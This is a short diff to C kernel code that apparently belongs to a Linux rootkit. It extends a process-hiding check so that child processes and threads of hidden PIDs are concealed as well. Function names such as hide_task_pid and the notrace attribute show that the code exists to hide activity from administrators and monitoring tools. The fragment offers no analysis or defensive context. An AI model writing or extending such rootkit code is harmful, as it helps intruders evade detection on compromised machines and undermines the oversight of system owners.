@@ -23,7 +23,7 @@ static inline bool should_hide_pid_by_int(int pid)
     if (pid <= 0)
         return false;
 
-    return is_hidden_pid(pid);
+    return is_hidden_pid(pid) || is_child_pid(pid) || pid_is_thread(pid);
 }
 
 static notrace void hide_task_pid(struct task_struct *task)
